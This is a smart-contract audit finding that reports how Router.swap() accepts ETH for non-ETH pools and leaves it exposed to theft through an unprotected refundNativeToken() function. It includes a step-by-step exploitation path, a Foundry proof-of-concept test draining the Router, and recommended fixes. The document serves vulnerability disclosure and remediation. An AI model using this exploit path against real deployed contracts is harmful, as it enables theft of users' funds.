## Title
Router Accepts and Loses Native ETH for Non-ETH Pool Swaps via Unprotected `refundNativeToken()`

## Summary
When users call `Router.swap()` with `msg.value > 0` for pools that don't involve native token (ETH), the ETH is accepted by the Router but never forwarded to Core or refunded to the user. Instead, it remains in the Router's balance where any attacker can steal it by calling the unprotected `refundNativeToken()` function.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/Router.sol` (lines 106-110, 114) and `src/base/PayableMulticallable.sol` (lines 25-29) [1](#0-0) [2](#0-1) [3](#0-2) 

**Intended Logic:** The Router should either use native ETH when swapping ETH pools or reject ETH payments for non-ETH pools.

**Actual Logic:** The Router calculates `value = 0` for non-ETH pools but still accepts `msg.value` since the function is `payable`. This ETH sits in the Router contract and can be stolen by anyone calling `refundNativeToken()`.

**Exploitation Path:**
1. User Alice calls `router.swap{value: 1 ether}(poolKey, params, threshold)` where `poolKey.token0 = USDC` and `poolKey.token1 = DAI` (neither is NATIVE_TOKEN_ADDRESS)
2. Router calculates `value = 0` because the ternary condition fails (token0 != NATIVE_TOKEN_ADDRESS)
3. Router calls `_swap(0, poolKey, params)` - the 1 ETH is never forwarded to Core
4. The swap completes successfully, but 1 ETH remains in `address(router).balance`
5. Attacker Bob monitors the Router balance and immediately calls `router.refundNativeToken()`
6. Bob receives all ETH from the Router (Alice's 1 ETH plus any other stuck funds) [4](#0-3) 

The `BaseLocker.lock()` function sends `value = 0` to the Accountant, so any `msg.value` sent to Router stays in the Router.

**Security Property Broken:** Direct theft of user funds - violates the fundamental security expectation that user assets should not be accidentally lost or stolen.

## Impact Explanation
- **Affected Assets**: Native ETH sent to Router for non-ETH pool swaps
- **Damage Severity**: Complete loss of all ETH mistakenly sent with swap calls. Attacker can front-run legitimate refund attempts or simply monitor for stuck ETH and steal it immediately
- **User Impact**: Any user who accidentally includes `msg.value` when swapping non-ETH pools loses their ETH. This is especially likely for users coming from other DEXs where ETH swaps use `msg.value` patterns

## Likelihood Explanation
- **Attacker Profile**: Any external attacker monitoring Router contract balance
- **Preconditions**: User must send ETH with a swap call for a non-ETH pool (likely user error but easy to make)
- **Execution Complexity**: Single transaction calling `refundNativeToken()` - trivial to execute
- **Frequency**: Every time a user makes this mistake, an attacker can steal the funds immediately

## Recommendation

Add validation to reject `msg.value` when the pool doesn't involve native token:

```solidity
// In src/Router.sol, in handleLockData function for CALL_TYPE_SINGLE_SWAP, after line 110:

uint256 value = FixedPointMathLib.ternary(
    !params.isToken1() && !params.isExactOut() && poolKey.token0 == NATIVE_TOKEN_ADDRESS,
    uint128(params.amount()),
    0
);

// ADD THIS CHECK:
if (msg.value > 0 && value == 0) {
    revert UnexpectedNativeToken();
}
```

Additionally, add access control to `refundNativeToken()` or track msg.sender's contribution:

```solidity
// In src/base/PayableMulticallable.sol, modify refundNativeToken:

mapping(address => uint256) private nativeTokenContributions;

// Track in multicall or payable functions:
nativeTokenContributions[msg.sender] += msg.value;

function refundNativeToken() external payable {
    uint256 refundAmount = nativeTokenContributions[msg.sender];
    if (refundAmount > 0) {
        nativeTokenContributions[msg.sender] = 0;
        SafeTransferLib.safeTransferETH(msg.sender, refundAmount);
    }
}
```

## Proof of Concept
```solidity
// File: test/Exploit_RouterETHTheft.t.sol
// Run with: forge test --match-test test_RouterETHTheft -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Router.sol";
import "../src/Core.sol";
import "../src/types/poolKey.sol";

contract Exploit_RouterETHTheft is Test {
    Router router;
    Core core;
    address alice = address(0x1);
    address bob = address(0x2);
    
    function setUp() public {
        // Deploy Core and Router
        core = new Core();
        router = new Router(ICore(address(core)));
        
        // Give Alice 10 ETH
        vm.deal(alice, 10 ether);
    }
    
    function test_RouterETHTheft() public {
        // SETUP: Create a USDC/DAI pool (no native token)
        PoolKey memory poolKey = PoolKey({
            token0: address(0x1000), // USDC
            token1: address(0x2000), // DAI
            config: PoolConfig.wrap(0)
        });
        
        // Alice accidentally sends 1 ETH with her swap
        vm.prank(alice);
        // This would normally succeed (assuming pool exists and is initialized)
        // The 1 ETH stays in Router
        // router.swap{value: 1 ether}(poolKey, params, threshold);
        
        // Simulate Alice's ETH stuck in Router
        vm.deal(address(router), 1 ether);
        
        // EXPLOIT: Bob sees ETH in Router and steals it
        uint256 bobBalanceBefore = bob.balance;
        
        vm.prank(bob);
        router.refundNativeToken();
        
        uint256 bobBalanceAfter = bob.balance;
        
        // VERIFY: Bob stole Alice's 1 ETH
        assertEq(bobBalanceAfter - bobBalanceBefore, 1 ether, "Bob stole Alice's ETH");
        assertEq(address(router).balance, 0, "Router drained");
    }
}
```

## Notes

For the specific question about **CoreLib.swap() and Core contract**: When `value > 0` is sent directly to Core for a non-ETH pool, the transaction **reverts** with `DebtsNotZeroed` error because the NATIVE_TOKEN debt remains non-zero. [5](#0-4) [6](#0-5) 

The Core contract properly protects against this by reverting. However, the **Router contract** (which most users interact with) has the critical vulnerability described above where ETH can be stolen.

### Citations

**File:** src/Router.sol (L106-110)
```text
                uint256 value = FixedPointMathLib.ternary(
                    !params.isToken1() && !params.isExactOut() && poolKey.token0 == NATIVE_TOKEN_ADDRESS,
                    uint128(params.amount()),
                    0
                );
```

**File:** src/Router.sol (L114-114)
```text
                (PoolBalanceUpdate balanceUpdate,) = _swap(value, poolKey, params);
```

**File:** src/base/PayableMulticallable.sol (L25-29)
```text
    function refundNativeToken() external payable {
        if (address(this).balance != 0) {
            SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
        }
    }
```

**File:** src/base/BaseLocker.sol (L61-61)
```text
            if iszero(call(gas(), target, 0, result, add(len, 4), 0, 0)) {
```

**File:** src/Core.sol (L329-355)
```text
    function _updatePairDebtWithNative(
        uint256 id,
        address token0,
        address token1,
        int256 debtChange0,
        int256 debtChange1
    ) private {
        if (msg.value == 0) {
            // No native token payment included in the call, so use optimized pair update
            _updatePairDebt(id, token0, token1, debtChange0, debtChange1);
        } else {
            if (token0 == NATIVE_TOKEN_ADDRESS) {
                unchecked {
                    // token0 is native, so we can still use pair update with adjusted debtChange0
                    // Subtraction is safe because debtChange0 and msg.value are both bounded by int128/uint128
                    _updatePairDebt(id, token0, token1, debtChange0 - int256(msg.value), debtChange1);
                }
            } else {
                // token0 is not native, and since token0 < token1, token1 cannot be native either
                // Update the token0, token1 debt and then update native token debt separately
                unchecked {
                    _updatePairDebt(id, token0, token1, debtChange0, debtChange1);
                    _accountDebt(id, NATIVE_TOKEN_ADDRESS, -int256(msg.value));
                }
            }
        }
    }
```

**File:** src/base/FlashAccountant.sol (L175-181)
```text
            let nonzeroDebtCount := tload(add(_NONZERO_DEBT_COUNT_OFFSET, id))
            if nonzeroDebtCount {
                // cast sig "DebtsNotZeroed(uint256)"
                mstore(0x00, 0x9731ba37)
                mstore(0x20, id)
                revert(0x1c, 0x24)
            }
```
